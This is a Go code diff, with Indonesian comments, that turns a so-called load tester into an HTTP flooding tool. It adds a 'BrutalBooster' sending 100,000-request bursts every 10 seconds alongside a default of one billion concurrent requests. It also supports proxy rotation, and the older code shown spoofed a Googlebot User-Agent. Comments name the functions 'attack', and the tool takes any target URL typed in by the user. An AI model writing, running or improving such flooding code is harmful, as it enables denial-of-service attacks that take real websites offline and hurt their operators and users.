@@ -18,6 +18,7 @@ import (
 	"sync/atomic"
 	"syscall"
 	"time"
+	"runtime"
 
 	"golang.org/x/net/http2"
 )
@@ -38,7 +39,7 @@ func Kuning(text string) string { return KUNING + text + RESET }
 func Ungu(text string) string   { return UNGU + text + RESET }
 func Cyan(text string) string   { return CYAN + text + RESET }
 
-type LoadTester struct {
+type FastRequests struct {
 	Link             string
 	numRequests      int64
 	concurrency      int
@@ -54,7 +55,139 @@ type LoadTester struct {
 	client           *http.Client
 }
 
-func NewLoadTester(Link string, numRequests int64, concurrency int, timeout time.Duration, method string, headers map[string]string, proxies []string) *LoadTester {
+type BrutalBooster struct {
+	burst     int64
+	interval  time.Duration
+	active    bool
+	client    *http.Client
+	workerPool chan struct{}
+	stats     struct {
+		success int64
+		failure int64
+		total   int64
+	}
+}
+
+func CreateBrutalBooster(burst int64, interval time.Duration, base *FastRequests, maxWorkers int) *BrutalBooster {
+	// Clone transport dari base, atau buat baru jika tidak ada
+	var transport *http.Transport
+	if base.client.Transport != nil {
+		if tr, ok := base.client.Transport.(*http.Transport); ok {
+			transport = tr.Clone()
+		}
+	}
+	if transport == nil {
+		transport = &http.Transport{
+			Proxy: http.ProxyFromEnvironment,
+		}
+	}
+
+	// Atur ulang parameter transport untuk booster (lebih agresif)
+	transport.MaxIdleConns = maxWorkers * 100
+	transport.MaxIdleConnsPerHost = maxWorkers * 50
+	transport.IdleConnTimeout = 10 * time.Second
+	transport.DisableCompression = true
+
+	// Konfigurasi HTTP2
+	http2.ConfigureTransport(transport)
+
+	return &BrutalBooster{
+		burst:    burst,
+		interval: interval,
+		client: &http.Client{
+			Transport: transport,
+			Timeout:   base.timeout,
+		},
+		workerPool: make(chan struct{}, maxWorkers),
+	}
+}
+
+func (bb *BrutalBooster) Run(ctx context.Context, url, method string, headers map[string]string) {
+	// Isi worker pool
+	for i := 0; i < cap(bb.workerPool); i++ {
+		bb.workerPool <- struct{}{}
+	}
+
+	ticker := time.NewTicker(bb.interval)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-ticker.C:
+			if bb.active {
+				go bb.launchBrutalAttack(ctx, url, method, headers)
+			}
+		case <-ctx.Done():
+			return
+		}
+	}
+}
+
+func (bb *BrutalBooster) launchBrutalAttack(ctx context.Context, url, method string, headers map[string]string) {
+	start := time.Now()
+	var wg sync.WaitGroup
+	requestsPerWorker := bb.burst / int64(cap(bb.workerPool))
+
+	// Jika tidak ada worker, keluar
+	if cap(bb.workerPool) == 0 {
+		return
+	}
+
+	for i := 0; i < cap(bb.workerPool); i++ {
+		<-bb.workerPool // Ambil slot worker
+		wg.Add(1)
+		
+		go func() {
+			defer wg.Done()
+			defer func() { bb.workerPool <- struct{}{} }() // Kembalikan slot
+			
+			for j := int64(0); j < requestsPerWorker; j++ {
+				select {
+				case <-ctx.Done():
+					return
+				default:
+					bb.sendTurboRequest(ctx, url, method, headers)
+				}
+			}
+		}()
+	}
+	
+	wg.Wait()
+	
+	// Adaptive throttling
+	duration := time.Since(start)
+	if duration < bb.interval {
+		time.Sleep(bb.interval - duration)
+	}
+}
+
+func (bb *BrutalBooster) sendTurboRequest(ctx context.Context, url, method string, headers map[string]string) {
+	atomic.AddInt64(&bb.stats.total, 1)
+	
+	req, err := http.NewRequestWithContext(ctx, method, url, nil)
+	if err != nil {
+		atomic.AddInt64(&bb.stats.failure, 1)
+		return
+	}
+	for k, v := range headers {
+		req.Header.Set(k, v)
+	}
+	
+	resp, err := bb.client.Do(req)
+	if err != nil {
+		atomic.AddInt64(&bb.stats.failure, 1)
+		return
+	}
+	defer resp.Body.Close()
+	
+	if resp.StatusCode == http.StatusOK {
+		atomic.AddInt64(&bb.stats.success, 1)
+	} else {
+		atomic.AddInt64(&bb.stats.failure, 1)
+	}
+}
+
+func FastSpamRequests(Link string, numRequests int64, concurrency int, timeout time.Duration, method string, headers map[string]string, proxies []string) *FastRequests {
 	var proxyFunc func(*http.Request) (*url.URL, error)
 	if len(proxies) > 0 {
 		proxyFunc = func(req *http.Request) (*url.URL, error) {
@@ -65,10 +198,10 @@ func NewLoadTester(Link string, numRequests int64, concurrency int, timeout time
 	// Jangan di otak atik ini udah pas super fast no komen.
 	transport := &http.Transport{
 		Proxy:               proxyFunc,
-		MaxIdleConns:        70000,
-		MaxIdleConnsPerHost: 50000,
-		IdleConnTimeout:     3 * time.Second,
-		TLSHandshakeTimeout: 1 * time.Second, //Fast requests
+		MaxIdleConns:        25000,
+		MaxIdleConnsPerHost: 25000,
+		IdleConnTimeout:     2 * time.Second,
+		TLSHandshakeTimeout: 200 * time.Millisecond,
 		DialContext: (&net.Dialer{
 			Timeout:   2 * time.Second,
 			KeepAlive: 2 * time.Second, 
@@ -80,11 +213,11 @@ func NewLoadTester(Link string, numRequests int64, concurrency int, timeout time
 		log.Fatalf("Gagal mengonfigurasi HTTP/2: %v", err)
 	}
 	client := &http.Client{
-    Transport: transport,
-    Timeout: timeout,
-}
+		Transport: transport,
+		Timeout:   timeout,
+	}
 
-	return &LoadTester{
+	return &FastRequests{
 		Link:        Link,
 		numRequests: numRequests,
 		concurrency: concurrency,
@@ -96,7 +229,7 @@ func NewLoadTester(Link string, numRequests int64, concurrency int, timeout time
 	}
 }
 
-func (lt *LoadTester) sendRequest(ctx context.Context) {
+func (lt *FastRequests) sendRequest(ctx context.Context) {
 	startTime := time.Now()
 	req, err := http.NewRequestWithContext(ctx, lt.method, lt.Link, nil)
 	if err != nil {
@@ -124,43 +257,43 @@ func (lt *LoadTester) sendRequest(ctx context.Context) {
 	}
 }
 
-func (lt *LoadTester) run(ctx context.Context, wg *sync.WaitGroup) {
-    defer wg.Done()
-    
-    // Pembantu pemercepat
-    jobs := make(chan struct{}, lt.concurrency)
-    var workerWg sync.WaitGroup
+func (lt *FastRequests) run(ctx context.Context, wg *sync.WaitGroup) {
+	defer wg.Done()
 
-    // Play Fast Attack
-    workerWg.Add(lt.concurrency)
-    for i := 0; i < lt.concurrency; i++ {
-        go func() {
-            defer workerWg.Done()
-            for range jobs {
-                select {
-                case <-ctx.Done():
-                    return
-                default:
-                    atomic.AddInt64(&lt.sentCount, 1)
-                    lt.sendRequest(ctx)
-                }
-            }
-        }()
-    }
+	// Pembantu pemercepat
+	jobs := make(chan struct{}, lt.concurrency)
+	var workerWg sync.WaitGroup
 
-    // Attack Fast Worker
-    go func() {
-        defer close(jobs)
-        for i := int64(0); i < lt.numRequests; i++ {
-            select {
-            case <-ctx.Done():
-                return
-            case jobs <- struct{}{}:
-            }
-        }
-    }()
+	// Play Fast Attack
+	workerWg.Add(lt.concurrency)
+	for i := 0; i < lt.concurrency; i++ {
+		go func() {
+			defer workerWg.Done()
+			for range jobs {
+				select {
+				case <-ctx.Done():
+					return
+				default:
+					atomic.AddInt64(&lt.sentCount, 1)
+					lt.sendRequest(ctx)
+				}
+			}
+		}()
+	}
 
-    workerWg.Wait()
+	// Attack Fast Worker
+	go func() {
+		defer close(jobs)
+		for i := int64(0); i < lt.numRequests; i++ {
+			select {
+			case <-ctx.Done():
+				return
+			case jobs <- struct{}{}:
+			}
+		}
+	}()
+
+	workerWg.Wait()
 }
 
 func printLogo() {
@@ -182,13 +315,14 @@ func printLogo() {
 	fmt.Println(logo)
 }
 
-func animate(ctx context.Context, lt *LoadTester, initialCycleDuration, summaryDuration, updateInterval time.Duration) {
-	symbols := []string{"▁", "▃", "▄", "▅", "▇"}
+func animate(ctx context.Context, lt *FastRequests, brutalBooster *BrutalBooster, initialCycleDuration, summaryDuration, updateInterval time.Duration) {
+	symbols := []string{"⚡"}
 	symbolIndex := 0
 	currentCycleDuration := initialCycleDuration
 	startCycle := time.Now()
 	ticker := time.NewTicker(updateInterval)
 	defer ticker.Stop()
+
 	for {
 		select {
 		case <-ctx.Done():
@@ -200,36 +334,68 @@ func animate(ctx context.Context, lt *LoadTester, initialCycleDuration, summaryD
 			var avgLatency int64
 			if done > 0 {
 				avgLatency = atomic.LoadInt64(&lt.totalLatency) / done / 1e6
-			} // Jangan di set ulang
+			}
+			
 			if elapsed >= currentCycleDuration {
 				total := done
 				summary := fmt.Sprintf("%s %s %s %s %s %s",
-					    Putih("\n "),
-					    Putih("➤"),
-   					 Cyan(fmt.Sprintf("%d", int(currentCycleDuration.Seconds()))),
- 					   Cyan("TIME"),
-                        Putih("➤"),
-  					  Hijau(fmt.Sprintf("%d", total)),
-		    	)
+					Putih("\n "),
+					Putih("➤"),
+					Cyan(fmt.Sprintf("%d", int(currentCycleDuration.Seconds()))),
+					Cyan("TIME"),
+					Putih("➤"),
+					Hijau(fmt.Sprintf("%d", total)),
+				)
 				fmt.Println(summary)
+
+				// Tampilkan statistik booster jika ada
+				if brutalBooster != nil && brutalBooster.active {
+					boostSuccess := atomic.LoadInt64(&brutalBooster.stats.success)
+					boostTotal := atomic.LoadInt64(&brutalBooster.stats.total)
+					boostLine := fmt.Sprintf("%s %s %s %s",
+						Putih(" "),
+						Putih("➤"),
+						Hijau(fmt.Sprintf("%d/%d", boostSuccess, boostTotal)),
+						Putih(" "),
+					)
+					fmt.Println(boostLine)
+				}
+
 				time.Sleep(summaryDuration)
 				fmt.Print("\033[2A\033[J")
 				currentCycleDuration += 60 * time.Second
 				startCycle = time.Now()
-			} else { // Jangan di set ulang
+			} else {
 				remaining := currentCycleDuration - elapsed
 				timerStr := fmt.Sprintf("%02d:%02d", int(remaining.Minutes()), int(remaining.Seconds())%60)
-				line := fmt.Sprintf("%s %s %s %s %s %s %s",
-			    	Cyan(symbols[symbolIndex%len(symbols)]),
+				
+				// Format utama lebih rapi
+				line := fmt.Sprintf("\r%s %s %s %s %s %s %s",
+					Cyan(symbols[symbolIndex%len(symbols)]),
 					Putih("➤"),
-                    Hijau(timerStr),
+					Hijau(timerStr),
 					Putih("➤"),
 					Hijau(fmt.Sprintf("%d", pending)),
 					Putih("➤"),
-                    Hijau(fmt.Sprintf("%d", avgLatency)),
+					Hijau(fmt.Sprintf("%d", avgLatency)),
 				)
+
+				// Jika ada booster, tambahkan info di baris yang sama
+				if brutalBooster != nil && brutalBooster.active {
+					boostSuccess := atomic.LoadInt64(&brutalBooster.stats.success)
+					boostTotal := atomic.LoadInt64(&brutalBooster.stats.total)
+					boostRPS := float64(boostTotal) / elapsed.Seconds()
+					line += fmt.Sprintf("  %s %s %s %.0f/s",
+						Putih("➤"),
+						Hijau(fmt.Sprintf("%d/%d", boostSuccess, boostTotal)),
+						Putih("➤"),
+						boostRPS,
+					)
+					//Diharapkan jadinya berjalan bersamaan antara requests dan bosternya langsung aktif
+				}
+
 				symbolIndex++
-				fmt.Print("\r" + line)
+				fmt.Print(line)
 			}
 		}
 	}
@@ -262,21 +428,31 @@ func getIP(Link string) string {
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
+	runtime.GOMAXPROCS(runtime.NumCPU())
+
+	// Harusnya tanpa flag biar dia ngebuat semaksimal mungkin tanpa kita batasi dia sendiri bisa menyesuaikan kemampuan dia ngebuat requests seberapa besara tanpa kita tuntut
+	boosterFlag := flag.Bool("booster", true, "Aktifkan mode brutal booster")
+	boosterWorkers := flag.Int("booster-workers", 100, "Jumlah worker booster")
+	boosterBurst := flag.Int64("booster-burst", 100000, "Jumlah request per interval booster")
+	boosterInterval := flag.Int("booster-interval", 10, "Interval booster dalam detik")
+
 	configPath := flag.String("config", "", "FILE JSON")
 	requestsFlag := flag.Int64("requests", 1000000000, "TOTAL REQUESTS")
-	concurrencyFlag := flag.Int("concurrency", 550, "CONCURRENCY")  //Jangan di lebihkan! 550 Cloudshell & 200 Termux & 750 Vps. Biar di seting sama gua.
-	timeoutFlag := flag.Float64("timeout", 2.8, "WAKTU SETIAP REQUEST") // Jangan di set ulang
+	concurrencyFlag := flag.Int("concurrency", 550, "CONCURRENCY")
+	timeoutFlag := flag.Float64("timeout", 3, "WAKTU SETIAP REQUEST")
 	methodFlag := flag.String("method", "GET", "HTTP METHOD")
 	logFlag := flag.String("log", "ERROR", "DEBUG, INFO, WARNING, ERROR")
 	noLiveFlag := flag.Bool("no-live", false, "MATIKAN LIVE OUTPUT")
-	proxyFile := flag.String("proxy", "", "FILE PROXY") //Gak perlu boar ngebut pake 1 ip real aja
+	proxyFile := flag.String("proxy", "", "FILE PROXY")
 	updateIntervalFlag := flag.Float64("update-interval", 0.10, "KECEPATAN LOADING")
 	flag.Parse()
+	
 	if strings.ToUpper(*logFlag) == "DEBUG" {
 		log.SetOutput(os.Stdout)
 	} else {
 		log.SetOutput(os.Stderr)
 	}
+	
 	configData := make(map[string]interface{})
 	if *configPath != "" {
 		conf, err := loadConfig(*configPath)
@@ -286,24 +462,28 @@ func main() {
 		}
 		configData = conf
 	}
+	
 	numRequests := *requestsFlag
 	if val, ok := configData["requests"].(float64); ok {
 		numRequests = int64(val)
 	}
+	
 	concurrency := *concurrencyFlag
 	if val, ok := configData["concurrency"].(float64); ok {
 		concurrency = int(val)
 	}
+	
 	timeoutSec := *timeoutFlag
 	if val, ok := configData["timeout"].(float64); ok {
 		timeoutSec = val
 	}
-	//Sengaja biar requests ngebut
+	
 	method := strings.ToUpper(*methodFlag)
 	headers := map[string]string{
-		"User-Agent":      "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", // Jangan di set ulang
-		"Connection":      "keep-alive", 
+		"User-Agent":      "",
+		"Connection":      "keep-alive",
 	}
+	
 	var proxies []string
 	if *proxyFile != "" {
 		data, err := ioutil.ReadFile(*proxyFile)
@@ -319,15 +499,18 @@ func main() {
 			}
 		}
 	}
+	
 	fmt.Print("\033[H\033[2J")
 	printLogo()
+	
 	var Link string
 	fmt.Print(Putih("➤ "))
 	fmt.Scanln(&Link)
 	
-	lt := NewLoadTester(Link, numRequests, concurrency, time.Duration(timeoutSec*float64(time.Second)), method, headers, proxies)
+	lt := FastSpamRequests(Link, numRequests, concurrency, time.Duration(timeoutSec*float64(time.Second)), method, headers, proxies)
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
+	
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
@@ -335,18 +518,32 @@ func main() {
 		fmt.Printf("\n%sDATA: %v. OFF TASK%s\n", Merah(""), sig, RESET)
 		cancel()
 	}()
+	var brutalBooster *BrutalBooster
+	if *boosterFlag {
+		brutalBooster = CreateBrutalBooster(
+			*boosterBurst,
+			time.Duration(*boosterInterval)*time.Second,
+			lt,
+			*boosterWorkers,
+		)
+		brutalBooster.active = true
+		go brutalBooster.Run(ctx, Link, method, headers)
+	}
+
 	var animWg sync.WaitGroup
 	if !*noLiveFlag {
 		animWg.Add(1)
 		go func() {
 			defer animWg.Done()
-			animate(ctx, lt, 60*time.Second, 1*time.Second, time.Duration(*updateIntervalFlag*float64(time.Second)))
+			animate(ctx, lt, brutalBooster, 60*time.Second, 1*time.Second, time.Duration(*updateIntervalFlag*float64(time.Second)))
 		}()
 	}
+	
 	var wg sync.WaitGroup
 	wg.Add(1)
 	go lt.run(ctx, &wg)
 	wg.Wait()
+	
 	cancel()
 	animWg.Wait()
 	fmt.Println("\n" + Hijau("Thanks!"))
